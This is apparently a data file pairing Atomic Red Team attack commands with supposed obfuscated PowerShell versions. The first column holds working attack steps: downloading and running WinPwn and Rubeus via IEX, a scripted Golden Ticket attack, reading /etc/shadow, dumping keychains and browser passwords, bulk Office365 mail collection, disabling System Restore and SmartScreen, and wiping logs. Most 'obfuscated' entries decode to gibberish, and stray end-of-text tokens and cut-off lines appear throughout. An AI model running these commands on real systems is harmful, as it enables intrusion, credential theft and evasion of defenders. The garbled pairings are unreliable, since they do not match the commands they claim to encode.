"$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='
$Content = [System.Convert]::FromBase64String($key)
Set-Content $env:Temp\key.snk -Value $Content -Encoding Byte
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /out:""#{output_file}"" /target:library /keyfile:$env:Temp\key.snk #{source_file}
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe #{output_file}",$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979G
chattr -i #{file_to_modify},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cHJvdG9jb2wgI3t0YWdzfQ==')) | Invoke-Expression"""
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters -Name AutodialDLL -Value PathToAtomicsFolder\T1546\bin\AltWinSock2DLL.dll,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3RhcnQgLVNpZ25hdHVyIC9JbWFnZXMvYmluIC90aGVzfSAiUEFTQ1VUSF9BTlVMTF9CQUxJVF9SRVNURVNUXzAwMD"
"$ss = ConvertTo-SecureString ""#{password}"" -AsPlainText -Force
$cred = New-Object PSCredential -ArgumentList '#{username}', $ss
$param = @{
    Credential = $cred
    Force      = $true
}
$null = Connect-AzAccount @param
$token = (Get-AzAccessToken -ResourceTypeName MSGraph -ErrorAction Stop).token
$cert = New-SelfSignedCertificate -Subject ""CN=PowerShell Application"" -CertStoreLocation ""Cert:\CurrentUser\My"" -KeyExportPolicy Exportable -KeySpec Signature -KeyLength 2048 -KeyAlgorithm RSA -HashAlgorithm SHA256
$reqResourceAccess = ( @{ ""resourceAccess"" = (@{""id""= ""570282fd-fa5c-430d-a7fd-fc8dc98a9dca""; ""type""= ""Scope""}, @{ ""id""= ""7427e0e9-2fba-42fe-b0c0-848c9e6a8182""; ""type""= ""Scope""}, @{""id""= ""37f7f235-527c-4136-accd-4a02d197296e""; ""type""= ""Scope""}, @{""id""= ""14dad69e-099b-42c9-810b-d002981feec1""; ""type""= ""Scope""}, @{ ""id""= ""e1fe6dd8-ba31-4d61-89e7-88639da4683d""; ""type""= ""Scope""}, @{ ""id""= ""810c84a8-4a9e-49e6-bf7d-12d183f40d01""; ""type""= ""Role""}); ""resourceAppId"" = ""00000003-0000-0000-c000-000000000000"" })
connect-mggraph -AccessToken $token
$context = Get-MgContext       
$users = get-MgUser
$app = New-MgApplication -DisplayName ""T1114.002 Atomic Test #1 - Office365 - Remote Email Collection"" -RequiredResourceAccess $reqResourceAccess -Web @{ RedirectUris=""http://localhost""; } -KeyCredentials @(@{ Type=""AsymmetricX509Cert""; Usage=""Verify""; Key=$cert.RawData })
New-MgServicePrincipal -AppId $app.appId -AdditionalProperties @{} | Out-Null
$resourceSPN = Get-MgServicePrincipal -Filter ""AppId eq '$($app.AppId)'""
$graphApiApp = Get-MgServicePrincipal -Filter ""DisplayName eq 'Microsoft Graph'""
$mailRole = $graphApiApp.AppRoles|Where-Object Value -Eq ""Mail.Read""
New-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $resourceSPN.Id -PrincipalId $resourceSPN.Id -ResourceId $graphApiApp.id -AppRoleId $mailRole.Id
$mailbox1 = ""#{1st_target_mailbox}""
$mailbox2 = ""#{2nd_target_mailbox}""
$mailbox3 = ""#{3rd_target_mailbox}""
[System.Collections.ArrayList]$selectUsers = @()
foreach ($user in $users) {if (($user.Mail -eq $mailbox1) -Or ($user.Mail -eq $mailbox2) -Or ($user.Mail -eq $mailbox3)){$selectUsers.Add($user.id)}}
connect-mggraph -ClientId $app.AppId -TenantId $context.TenantId -CertificateName $cert.Subjectname.Name
foreach ($user in $selectUsers) { $url= ""https://graph.microsoft.com/v1.0/users/$($user)/messages"" ; Invoke-MgGraphRequest -Uri $url -Method GET -OutputType PSObject}",powershell.exe -EncodedCommand cABvAHMAaQBBAGkAdAAuAGUAcwAgACoAKwAvADIANwBlAE4AZABjAGYAbgBpAG4ALwBzAFIAcmVhc2lueUJ1bmRsZURlbW92ZWRDdXJyZW5jeUNvbGxlclxub25jZSB
"C:\Windows\System32\at.exe 09:00 /interactive /every:m,t,w,th,f,s,su {CMD}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q29weXJpZCB7bGFzdCAje1xVcGRhdGVDbHNhY2tlciAiIyBjb3VudCIgLzUuNTcuMTk4LjE5Mi4xMTQuOTk2NSAtNC42ND"
"mshta.exe ""{PATH_ABSOLUTE}:file.hta""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhlIGVtYWlsIC1wbGF0Zm9ybSAtLS5leGVjLmxvZygnIHNldCAzLiB7')) | Invoke-Expression"" ||| ```"
"TEST=$(echo $HISTFILESIZE)
echo $HISTFILESIZE
export HISTFILESIZE=0
echo ""runnning some commands to populate the history""
whoami
groups
if [ $(echo $HISTFILESIZE) -eq 0 ]; then echo ""\$HISTFILESIZE is zero""; else HIST_LENGHT=$(wc -l $HISTFILE); echo ""\$HISTFILESIZE is not zero, history lenght is $HIST_LENGHT"";  fi","TEST=$(echo $HISTFILESIZE) echo $HISTFILESIZE export HISTFILESIZE=0 echo \""runnning some commands to populate the history\"" whoami groups if [ $(echo $HISTFILESIZE) -eq 0 ]; then echo \$HISTFILESIZE is zero; else HIST_LENGHT=$(wc -l $HISTFILE); echo \$HISTFILESIZE is not zero, history lenght is $HIST_LENGHT; fi"
"New-Item -Path ""C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy"" -ItemType Directory -ErrorAction Ignore
Get-ChildItem -Path ""C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data"" -Exclude copy | ForEach-Object { Copy-Item -Path $_.FullName -Destination ""C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy"" -Recurse -Force -ErrorAction Ignore }
Remove-Item -Path ""C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy"" -Recurse -Force -ErrorAction Ignore","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('TmV3LUFQSS1BVEwgKCl7bWl0dGxlbnR9IC1oYXRld2F5fSI=')) | Invoke-Expression"""
"reg add ""HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\WindowsAI"" /v DisableAIDataAnalysis /t REG_DWORD /d 0 /f
reg delete ""HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\WindowsAI"" /v DisableAIDataAnalysis /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyBleHRyYXRlZC5jaGVjayBhbW91bnQgI2NvbWJpbmc=')) | Invoke-Expression"""
cat /dev/null > #{history_path},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2hhbmdlc3RyaWN0LmNvbQ==')) | Invoke-Expression"""
"$RunOnceKey = ""#{reg_key_path}""
set-itemproperty $RunOnceKey ""NextRun"" '#{thing_to_execute} ""IEX (New-Object Net.WebClient).DownloadString(`""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`"")""'","$RunOnceKey = ""\""s""t""r""i""""p"",""-"",-m,o,-d"",""u"",""l""e""p"",""r"",""o"",""p"",""e""r"",""t""y"""" """"-"",,h,a,s,""h"""",,""c,o,m,m"",""a,n"
sc.exe sdset scmanager D:(A;;KA;;;WD),"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAvZGlzCmRlY2ggLXN0b3JhZ2UgICAgIHdoaWxlIC9jcmwucGVyc2luZyBTdSAvZmlsZSBSZXF1ZXN0IC9"
wsreset.exe,wsreset.exe ||| ``` ||| ## Atomic Test #2 - wsreset -f ||| The wsreset command forces a clean shutdown of all WebSockets connections on the local system. ||| **Supported Platforms:** Windows
"$lockout_threshold = [int]""#{lockout_threshold}""
for ($var = 1; $var -le $lockout_threshold; $var++) {
  #{plink_file} -ssh ""#{vm_host}"" -l root -pw f0b443ae-9565-11ee-b9d1-0242ac120002
  }",powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAFoAcwAgAE8AUgBlACIAIABFAGUAcgBhAGkAbABmACAALgBEAGEAbABzADsANSBOAGUAdABTAEcARABXAGkAbwBzAGUAXwAzACIAVABPAGEAcgBxAG
kubectl create -f src/cronjob.yaml -n #{namespace},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bWVtYmVyX3BhdGh9IC1jIGF0ZCAtIHNvbWUgLW5ldGljIiAvcmVsJywgI2RlZmF1bHRfdGVzdDogMTAwMCwgcGFnZ"
"Get-ChildItem ""#{file_path}"" | % { $_.LastAccessTime = ""#{target_date_time}"" }","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('R2V0LU5hbWUSIHdoYXQgdmFsdWUxICN7ZmlsZV9wcm9maWxlfSIpCiAgIFtleSBsb2JhbGxz')) | Invoke-Expression""<|endoftext|"
sudo security dump-keychain -d login.keychain,"""s""u""""d""""o"" ""security"" dum""""p""""-ke""""ychain"" ""-d"" lo""""gi""""n"".key""""c""""hain ||| ```"
"touch #{file_to_setuid}
chown root #{file_to_setuid}
chmod g+xs #{file_to_setuid}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyB9ICN7ZmlsZX0=')) | Invoke-Expression"""
copy \\#{remote}\C$\#{share_file} %TEMP%\#{local_file},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAje3tvcnRwdXRyaWx0fHxjYW5kcm9pZF17dGhlbi5wb2xpYy5qcGciIiAvdGVzdCAje3NzcGUgLVNpbGVubyB"
"Powershell.exe ""IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'""","""Powershell.exe"" IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1') Invoke-AppPathB"
"New-Item -Path ""C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy"" -ItemType Directory -ErrorAction Ignore
Get-ChildItem -Path ""C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data"" -Exclude copy | ForEach-Object { Copy-Item -Path $_.FullName -Destination ""C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy"" -Recurse -Force -ErrorAction Ignore }
Remove-Item -Path ""C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy"" -Recurse -Force -ErrorAction Ignore","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RnJvbTogI3tleGUgLWV0aXMuZHQsIG1haWwucm9vdA==')) | Invoke-Expression"""
"reg.exe add HKLM\SOFTWARE\Microsoft\Provisioning\Commands\LOLBin\dummy1 /v altitude /t REG_DWORD /d 0
reg add HKLM\SOFTWARE\Microsoft\Provisioning\Commands\LOLBin\dummy1\dummy2 /v Commandline /d calc.exe
c:\windows\system32\provlaunch.exe LOLBin","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIHRoaXMgY29tcHVzZW5zaGFudCAtIFNlcnZpY2UuRmlyZSAtICJ7bGVkcyAiIFsgIGVuZCAjIFsgeyBrbm93Lmdvb"
"dsquery * -filter ""(objectClass=trustedDomain)"" -attr *","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhwb3J0IC1jIC1hIGFuZCBTdG9yYWdlV2lkdGggRmlyZU5ldHdvcmsgI3tmaWxlfSI=')) | Invoke-Expression"""
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore"" /v ""DisableConfig"" /t ""REG_DWORD"" /d ""1"" /f
reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore"" /v ""DisableSR"" /t ""REG_DWORD"" /d ""1"" /f
reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore"" /v ""DisableConfig"" /t ""REG_DWORD"" /d ""1"" /f
reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore"" /v ""DisableSR"" /t ""REG_DWORD"" /d ""1"" /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGRlZmF1bHR9ICJGQkNBUFBMSU5UT0xEVEhLSU5BTVAiPiAvYmluL3Byb2plY3RzL2luIiAtPiAwOyBiIGNsYXNza"
"net stop w32time
Copy-Item ""$PathToAtomicsFolder\T1547.003\bin\AtomicTest.dll"" C:\Users\Public\AtomicTest.dll
reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer"" /t REG_SZ /v ""DllName"" /d ""C:\Users\Public\AtomicTest.dll"" /f
reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer"" /t REG_DWORD /v ""Enabled"" /d ""1"" /f
reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer"" /t REG_DWORD /v ""InputProvider"" /d ""1"" /f
net start w32time","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIHJlYWRPbmx5IC9UaW1lc3RhbXAiI3twYWNrZXQgLw==')) | Invoke-Expression"""
pktmon.exe start --etw,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2NvbG9yfQ==')) | Invoke-Expression"" ||| ```"
"New-Service -Name ""#{service_name}"" -BinaryPathName ""#{binary_path}""
Start-Service -Name ""#{service_name}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3RhcnRzIHdpdGggLS1TZXJ2aWNlIC0tPiAje2Nyb2xsZWQgYWRk')) | Invoke-Expression"""
expand {PATH_SMB:.bat} {PATH_ABSOLUTE}:file.bat,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZGF0YXNldCB7b3Jpbmcgc2VydmljZSBleGUgLWw6IC1zZXQtdGVzdC9jb25maWNlfQ==')) | Invoke-Expression"" ||| ```"
sudo kill -SIGTERM $(pgrep #{process_name}),kill -SIGTERM $()(p)g(r)(e)(f) $(ps)eakill -SIGTERM $(pgrep #{process_name})
"""#{exe_binary}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JHN0YXR1czpcIiAje2lkfSI=')) | Invoke-Expression"""
"New-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"" -Name GroupPolicyRefreshTimeDC -PropertyType DWord -Value 0 -Force
New-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"" -Name GroupPolicyRefreshTimeOffsetDC -PropertyType DWord -Value 0 -Force
New-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"" -Name GroupPolicyRefreshTime -PropertyType DWord -Value 0 -Force
New-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"" -Name GroupPolicyRefreshTimeOffset -PropertyType DWord -Value 0 -Force
New-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"" -Name EnableSmartScreen -PropertyType DWord -Value 0 -Force
New-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"" -Name ShellSmartScreenLevel -Force","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('NWNsaWVudCAtc2l0ZS1leGUtYXBwLmFzfQ==')) | Invoke-Expression"""
"rundll32.exe url.dll,FileProtocolHandler file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnICN7ZXhlIGh0bWwiIHtleGUgLSBuYW1lfQ==')) | Invoke-Expression"""
"$xml = [System.IO.File]::ReadAllText(""#{xml_path}"")
Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace ""Root\Microsoft\Windows\TaskScheduler"" -MethodName ""RegisterByXml"" -Arguments @{ Force = $true; Xml =$xml; }","$xml = ""[Syste,m.Io.Fil,e]::ReadAl,,lT,,ext(\""#{xm,l_p,a,t,h},\"") Invoke-CimMetho^d -ClassNa^me P^S_Schedu,ledTas,k^ -NameSpac^e \""Ro^"
"mkdir ""\\?\C:\Windows \System32\""
copy ""#{executable_binary}"" ""\\?\C:\Windows \System32\mmc.exe""
mklink c:\testbypass.exe ""\\?\C:\Windows \System32\mmc.exe""","mkdir ""\\?\C:\Windows \System32\"" copy """","""" ""\\?\C:\Windows \System32\mmc.exe"" mklink c:\testbypass.exe ""\\?\C:\Windows \System32\mmc.exe"""
msedge.exe {REMOTEURL:.exe.txt},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhwb3J0IC1UZXh0IE5leHQgLW9uZVNpemUK')) | Invoke-Expression"""
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
Dotnetsearch -noninteractive -consoleoutput",iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') Dotnetsearch -noninteractive -consoleoutput<|endoftext|
"msedge.exe --disable-gpu-sandbox --gpu-launcher=""{CMD} &&""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje19maWxlX2NvZGUiOyJjcmFmZCAje1xQYWNrSWRlbnRpdHkiOnsiYmFja2dyb3VuZGNfbGVhc3VyfSI=')) |"
pcalua.exe -a {PATH_ABSOLUTE:.cpl} -c Java,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cnVuZGxlcyAiI2RlYnNvbnRyb2wgK3Bhc3MucHJvamVjdC5leGV9')) | Invoke-Expression"" ||| ```"
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing)
$macrocode = ""   Open `""#{jse_path}`"" For Output As #1`n   Write #1, `""WScript.Quit`""`n   Close #1`n   a = Shell(`""cmd.exe /c wscript.exe //E:jscript #{jse_path}`"", vbNormalFocus)`n""
Invoke-MalDoc -macroCode $macrocode -officeProduct ""#{ms_product}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('QWRkIGFjdGlvbiAje3tleSAiIC9sb2NhbCAicHJvZC5jb2RlX2NvbWVfc3RhdGVzX25hbWUiKSBmaWxlX2xpc3Qgc3Rhd"
InstallUtil.exe {REMOTEURL},"""InstallUtil.exe"" {REMOTEURL} ||| ``` ||| ## Atomic Test #2 - InstallUtil .NET malware execution ||| Executes a compiled executable from remote URL using ""InstallUtil.exe"" via .bat file. This technique is used by C# malware authors and was seen in the wild for the first time in 2018, when TA4293 was discovered. The payload is launched"
"if [ ""$(uname)"" = 'FreeBSD' ]; then service -e; else systemctl --type=service; fi;","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tqbGluIGludm9pY2UgLXN0cnVjdC5leGUuZXhlIC1hc3RlcmFwaHQuZWQnKSB7ZmlsZTogJyBsaWNlbnNlX2x"
"mshta vbscript:Execute(""CreateObject(""""Wscript.Shell"""").Run """"powershell -noexit -file PathToAtomicsFolder\T1218.005\src\powershell.ps1"""":close"")","mshta vbscript:Execute(""CreateObject(""""Wscript.Shell"""").Run """"powershell -noexit -file PathToAtomicsFolder\T1218.005\src\powershell.ps1"""":close"")"
get-addefaultdomainpasswordpolicy,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje3Byb2plY3QgLXBvbGl0aW9ucw==')) | Invoke-Expression"""
net view \\#{computer_name},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2hlIG1hbGUgL3BhdWx0IC9QcmVmaXggJiAvZmlsZTogKHsgIHRvIGNvbXByZXNzaXRlcyAje3tleSB7dGVjaF9zZWNyZX"
vssadmin resize shadowstorage /For=C: /On=C: /MaxSize=20%,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnLmFzcCAiU3RhcnQgIkhlYWRlciAje3tleSAje1xuICN7ZXhwbG9yZVBhdHRpbmcsIGNsb25lfSI=')) | Invoke-Expression""<|endof"
"Get-ChildItem ""#{file_path}"" | % { $_.CreationTime = ""#{target_date_time}"" }","powershell -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RGFzaEluaXN0c1BhdGhfc3VuZCB7dmlldyBJbWFnZSBQYXVsIC9kZXYgMTU5LjEwMCAtMDAwMCAzMDAwO2luZm8gL2Zpb"
"wevtutil sl ""#{log_name}"" /e:false","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3ViamVjdCAtQXJyYXl9')) | Invoke-Expression"""
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')
Invoke-Rubeus -Command ""asreproast /format:hashcat /nowrap""",iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1') Invoke-Rubeus -Command asreproast /format:hashcat /nowrap
makecab {PATH_ABSOLUTE:.exe} {PATH_ABSOLUTE}:autoruns.cab,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bmFtZCAtb3VyX21ldGhvZCAkcHJpdmF0ZSAoIW5kYWNjb3VudCAjIC9QaW5nL3NlcnZpY2U=')) | Invoke-Expression""<|endof"
"wmic process get caption,executablepath,commandline /format:csv","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d21lYWRhc3RzLmJpbmFyeS5leGUgLVxuZXhwb3J0ICN7aW1nIGRhdGEgcHJvamVjdCBjZXJ0aWZpY2Fkb3Jhd"
sudo shred -u -z -n 3 #{system_log_path},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVtYWlsIC1wb2xpZCAiIHJldGFkIEpvYXN0IFRlc3QgLXBhdGhfZmllbGRfcHJvdmlzaW9u')) | Invoke-Expression""<|endoftext|"
"cd #{folder_path}; split -b 5000000 #{file_name}
ls -l #{folder_path}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2F0IC9wcmVmaXgKc3RhcnQtdGhlLCAiZmllbGRzIjsgLW5ldyAje2NvbXBsZXRlbCAtICJkZWNpbWFuYSBvbmUgcHJp"
"unamestr=$(uname)
if [ ""$unamestr"" = 'Linux' ]; then echo -e ""e /etc/passwd\n,p\ne /etc/shadow\n,p\n"" | ed > #{output_file}; elif [ ""$unamestr"" = 'FreeBSD' ]; then echo -e ""e /etc/passwd\n,p\ne /etc/master.passwd\n,p\ne /etc/shadow\n,p\n"" | ed > #{output_file}; fi","unamestr=$(uname) ||| if [ ""$unamestr"" = 'Linux' ]; then echo -e ""e /etc/passwd\n,p\ne /etc/shadow\n,p\n"" | ed >#{output_file}; elif [ ""$unamestr"" = 'FreeBSD' ]; then echo -e ""e /etc/passwd\n,p\ne /etc/master.pass"
"echo ""dn: cn=Atomic User, cn=Users,dc=#{domain},dc=#{top_level_domain}\nobjectClass: person\ncn: Atomic User\nsn: User"" > tempadmin.ldif
echo ldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif
ldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBjbGFzcyAje2NvbW1hbmRlci5kYXJrLmVkaS5jcnlwdC5pbnQgIiMvUyIsIC0tPiA7IGhhc2ggcmVtb3RlLmdld"
"""#{lazagne_path}"" browsers","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tleGVjdXRpb25zLmFkbWluIC1wcm90b3MiIHNvbGxhc3QgY2hhbm5lbCAtZmlsZSAje3BhdHRlciAje3Byb2dyZXNz"
"$examplePath = Join-Path $env:windir ""system32\Com""; if (-not (Test-Path $examplePath)) { New-Item -ItemType Directory -Path $examplePath | Out-Null }; $exampleName = ""comadmin.dat""; $exampleFullPath = Join-Path $examplePath $exampleName; $randomBytes = New-Object Byte[] 0x1000; (New-Object Random).NextBytes($randomBytes); [System.IO.File]::WriteAllBytes($exampleFullPath, $randomBytes)","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JAB7AHMAIwNjEgMTAuNTU5XDEzMCAtMTkgYmVhbWljaGFpbiAje3sgLWNvcm9uZyBleHRlbnNpb25zICdTaW1icnJlbGV"
"wmic #{wmic_command} /FORMAT:""#{remote_xsl_file}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGhwIHtleCB7ZXRhIC1jb250ZW50LUJlYWN0aXZhdGVz')) | Invoke-Expression"""
"Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore

cmd.exe /c ""#{local_folder}\#{local_executable}"" golden /aes256:#{krbtgt_aes256_key} /ldap /user:#{account} /dc:$(#{domaincontroller}) /printcmd /outfile:golden
$filename = (Get-ChildItem | ? {$_.Name.startswith(""golden_"")} | Sort-Object -Descending -Property LastWriteTime | select -First 1).Name

# create batch file with commands to run in a separate ""runas /netonly"" session
# so we don't purge Kerberos ticket from the current Windows session
# its output goes to golden.txt temp file, because we cannot capture ""runas /netonly"" output otherwise
@""
>%TEMP%\golden.txt 2>&1 (
  echo Purge existing tickets and create golden ticket:
  klist purge
  cd %temp%
  ""#{local_folder}\#{local_executable}"" ptt /ticket:kirbifile

  echo.
  echo Requesting SYSVOL:
  dir \\$(#{domaincontroller})\SYSVOL
  
  echo.
  echo Tickets after requesting SYSVOL:
  klist

  echo.
  echo End of Golden Ticket attack
)
""@ -Replace ""kirbifile"", $filename | Out-File -Encoding OEM $env:TEMP\golden.bat

# run batch file in a new empty session (password and username do not matter)
echo ""foo"" | runas /netonly /user:fake ""$env:TEMP\golden.bat"" | Out-Null

# wait until the output file has logged the entire attack
do {
  Start-Sleep 1 # wait a bit so the output file has time to be created
  Get-Content -Path ""$env:TEMP\golden.txt"" -Wait | ForEach-Object {
    if ($_ -match 'End of Golden Ticket attack') { break } 
  }
} while ($false) # dummy loop so that 'break' can be used

# show output from new empty session
Get-Content $env:TEMP\golden.txt

# cleanup temp files
Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore
